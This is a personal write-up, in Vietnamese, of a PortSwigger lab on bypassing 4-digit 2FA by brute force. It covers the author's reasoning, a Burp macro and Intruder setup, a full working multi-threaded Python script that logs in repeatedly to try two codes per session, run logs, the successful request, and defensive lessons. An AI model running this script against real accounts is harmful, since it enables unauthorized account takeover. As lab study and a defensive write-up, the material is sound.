![[Pasted image 20261018194740.png]]
-mô tả lab: login `carlos:montoya` xong thì bị đứng ở `/login2` đòi mã 2FA 4 số. Đề nói đã có user/pass nhưng không có mã → phải brute. Mình brute bằng script nhiều session song song (mỗi session thử được đúng 2 mã), ra mã `0900` sau ~4 phút.

> [!NOTE] đề nói gì
> - link lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
> - độ khó: Practitioner
> - creds: `carlos:montoya` — mục tiêu: brute mã 4 số rồi vào trang tài khoản carlos
> - hint chính thức: dùng Burp macro + Intruder; ai thạo Python có thể dùng Turbo Intruder

### quá trình suy nghĩ (từ quan sát tới kết quả)

1. **quan sát:** flow là `POST /login` → 302 `/login2`; form xin "4-digit security code", có `csrf` ẩn. Cả `/login` lẫn `/login2` đều bắt csrf — bỏ csrf ra là 400 (Missing/Invalid).
2. **đoán hụt lần đầu:** tưởng nện 0000→9999 vào một session là xong. Nhưng sai mã 1, mã 2 → vẫn 200 "Incorrect security code"; đến mã thứ 3 → **400** luôn, và `GET /login2` bằng session đó trả **500**.
3. **suy ra cơ chế:** server đếm số lần sai **theo session**: cho đúng 2 lần, lần thứ 3 là session bị hủy (csrf cũ chết theo). Muốn brute tiếp thì phải login lại tạo session mới → đây là kiểu rate limit đếm sai chỗ.
4. **kiểm tra thêm:** login lại liên tục không bị chặn theo tài khoản/IP → mở song song nhiều session được, tốc độ = số worker. Không có email client (`/email` → 404) nên không có đường tắt nào để đọc mã.
5. **một chi tiết phải xử lý:** `csrf` của `/login2` gắn với session đang chờ 2FA — lấy token của session này đem dùng cho session khác là 400 Invalid CSRF. Nên mỗi session phải tự `GET /login2` để lấy token mới.
6. **chốt chiến thuật:** mỗi cycle = `GET /login (csrf)` → `POST /login` → `GET /login2 (csrf)` → `POST mfa-code` ×2 = 5 request / 2 mã. Nhiều worker dùng chung một counter mã, dấu hiệu trúng là response **302 `Location: /my-account`**.
7. **chạy:** 25 worker, tốc độ ~8 mã/s, không lỗi; trúng ở ~4 phút. Đề có lưu ý: code có thể *reset* giữa chừng (số mới rơi vào khoảng đã thử), khi đó phải chạy lại — lần của mình ra luôn.
8. **kết quả:** `mfa-code=0900` → 302 `/my-account?id=carlos` → banner *"Congratulations, you solved the lab!"*.

### hướng giải (checklist)

- [ ] login `carlos:montoya`, xem flow `/login2`
- [ ] thử 3 mã sai, xác nhận bị hủy session sau đúng 2 lần
- [ ] chọn cách brute: Burp macro + Intruder (chuẩn) hoặc script Python
- [ ] mỗi session lấy csrf mới, thử 2 mã, login lại — lặp tới khi trúng
- [ ] tìm response 302 `/my-account` → vào trang carlos → solved

### giải

**cách chuẩn theo đề (Burp macro + Intruder):**

- Settings → Sessions → Session handling rules → Add:
  - Scope: Include all URLs.
  - Details → Rule Actions → Add → Run a macro → Macro Recorder chọn 3 request: `GET /login`, `POST /login`, `GET /login2` → Test macro, thấy response cuối là trang xin mã 4 số là ok.
- Gửi `POST /login2` sang Intruder, payload position ở `mfa-code`; payload type **Numbers**: 0 → 9999, step 1, min/max integer digits = 4 → được đủ 10.000 mã.
- Mở Resource pool → set **Maximum concurrent requests = 1** (chạy lần lượt, tránh rối session).
- Start attack → tìm request trả về **302** (các request còn lại là 200 "Incorrect"). Nếu chạy hết mà không có thì chạy lại vòng mới — code có thể reset giữa chừng.
- Right-click request 302 → "Show response in browser" → copy URL dán vào browser → vào "My account" là solved.

**cách mình chạy thật — script Python nhiều worker:**

logic: mỗi thread tự login lại để có session + csrf mới, thử 2 mã, lặp; counter mã dùng chung; thấy 302 `/my-account` là dừng.

```python
#!/usr/bin/env python3
# brute mã 2FA cho lab "2FA bypass using a brute-force attack"
# cơ chế: mỗi session /login2 chỉ cho thử 2 mã rồi bị hủy -> phải login lại liên tục,
# nên chạy nhiều worker song song + mỗi session tự lấy csrf riêng.
import re
import time
import threading
import itertools
import requests

HOST = "0a4d003f03fec6b580013a0500b00047.web-security-academy.net"  # đổi thành lab của bạn
BASE = f"https://{HOST}"

lock = threading.Lock()
stop = threading.Event()
state = {"code": None, "cycles": 0, "codes": 0}


def csrf(html):
    m = re.search(r'name="csrf" value="([^"]+)"', html)
    return m.group(1) if m else None


def worker(counter):
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    while not stop.is_set():
        try:
            # 1. login lại -> session mới (được thử 2 mã/session)
            s.post(f"{BASE}/login", data={
                "csrf": csrf(s.get(f"{BASE}/login", timeout=20).text),
                "username": "carlos", "password": "montoya"}, timeout=20)
            # 2. lấy csrf của riêng session này
            tok = csrf(s.get(f"{BASE}/login2", timeout=20).text)
            if not tok:
                continue
            # 3. thử 2 mã liên tiếp
            with lock:
                n = next(counter)
            for code in (f"{n % 10000:04d}", f"{(n + 1) % 10000:04d}"):
                r = s.post(f"{BASE}/login2", data={"csrf": tok, "mfa-code": code},
                           allow_redirects=False, timeout=20)
                with lock:
                    state["codes"] += 1
                if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
                    with lock:
                        state["code"] = code
                    stop.set()
                    s.get(f"{BASE}/my-account", timeout=20)  # vào trang account -> solved
                    print("FOUND:", code)
                    return
            with lock:
                state["cycles"] += 1
        except Exception:
            time.sleep(0.3)


def main():
    counter = itertools.count(0)
    threads = [threading.Thread(target=worker, args=(counter,), daemon=True) for _ in range(25)]
    for t in threads:
        t.start()
    t0 = time.time()
    while not stop.is_set() and time.time() - t0 < 840:
        time.sleep(5)
        print(f"{int(time.time()-t0):4d}s | cycles={state['cycles']} codes={state['codes']} found={state['code']}")
    print("RESULT:", state["code"])


if __name__ == "__main__":
    main()
```

chạy:

```
pip install requests   # nếu chưa có
python3 brute2fa.py    # 25 worker, tối đa 840s
```

log thật:

```
[   90s] cycles=368 codes=737 (8.2/s) errors=0 last=None
...
[  220s] cycles=898 codes=1801 (8.2/s) errors=0 last=None
[+] FOUND! code=0900 | my-account: : carlos
[  225s] cycles=919 codes=1843 (8.2/s) errors=0 last=0900
RESULT: FOUND code=0900
```

-> tổng: 919 session, 1843 mã, ~3,7 phút, 0 lỗi.

request trúng (mình lưu lại nguyên gói):

```http
POST /login2 HTTP/1.1
Host: 0a4d003f03fec6b580013a0500b00047.web-security-academy.net
Cookie: session=oI1YNU8HTR0SA6qTKS0uF4WsU4T7m9dN
Content-Type: application/x-www-form-urlencoded

csrf=i7C5ctfsURPdI4UuUkhNlLa7L9wNAVaG&mfa-code=0900

HTTP/1.1 302 Found
Location: /my-account?id=carlos
```

=> vào `/my-account` thấy "Your username is: carlos" → solved.
![[Pasted image 20261018235227.png]]
### bài học

> [!NOTE]
> - rate limit **theo session** là vô dụng với brute: attacker login lại là counter reset. Phải đếm theo **tài khoản (+ IP)**, khóa/backoff sau N lần sai và ghi log cảnh báo.
> - mã 4 số = 10^4 khả năng; không limit theo account thì brute vài phút là ra (mình chạy ~8 mã/s) — 2FA muốn an toàn phải khóa sau vài lần sai + thông báo cho user.
> - code nên single-use, TTL ngắn; token anti-CSRF không cứu được nếu counter đặt sai chỗ.
> - liên quan: [[lys thuyet authentication]], [[Lab-2FA simple bypass]], [[Lab-Broken brute-force protection, IP block]], [[Lab-Username enumeration via different responses]]; ôn phỏng vấn: [[on tap vin]], [[tra loi pv]].


